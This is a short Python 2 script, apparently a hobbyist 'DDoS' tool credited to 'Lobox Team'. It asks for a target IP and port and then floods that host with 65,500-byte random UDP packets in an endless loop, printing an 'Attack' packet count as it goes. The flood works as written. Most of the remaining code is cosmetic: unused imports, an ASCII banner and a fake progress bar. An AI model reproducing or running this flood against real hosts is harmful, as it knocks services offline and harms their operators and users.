import scapy
import sys
import re
import io
import datetime
import time
import pyping
import synping
import requests
import random
import Queue
import urllib
import threading
import logging
import socket

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def PROCCES(teks):
    for i in teks+"\n":
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)

#Main
print"""\033[32;1m

d8888b. d8888b.  .d88b.  .d8888. 
88  `8D 88  `8D .8P  Y8. 88'  YP 
88   88 88   88 88    88 `8bo.   
88   88 88   88 88    88   `Y8b. 
88  .8D 88  .8D `8b  d8' db   8D 
Y8888D' Y8888D'  `Y88P'  `8888Y' 
 .-----.---.-.----.---.-.-----.-----.---.-.-----.
 |  _  |  _  |   _|  _  |     |  _  |  _  |     |
 |___  |___._|__| |___._|__|__|___  |___._|__|__|
 |_____|                      |_____|            
                                      ( "ELITE" )
Set-By ( Lobox Team )
"""
#######################################################################       
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
PROCCES ("/>.[input host/ip Target] ")
host = raw_input("IP Target  : ")
PROCCES ("/>.[input port - Target] ")
port = input    ("Port Target : ")
bytes = random._urandom(65500)
stream_str = io.BytesIO(b"JournalDev Python: \x00\x01")
sent = 0
####################PROGRESS DATA BAR####################################

from tqdm import tqdm
from time import sleep

for i in tqdm(range(100)):
    sleep(0.02)

#PROCCES ("/>.Procces-Load -||||||||||||||||||-100%")
#######################################################################
while True:
    sock.sendto(bytes, (host,port))
    sent = sent + 65535
    port = port + 0
    print "Sent %s packet Attack %s <<==>> port:%s"%(sent,host,port)
    if port == 65535:
        port = 65535
#######################################################################
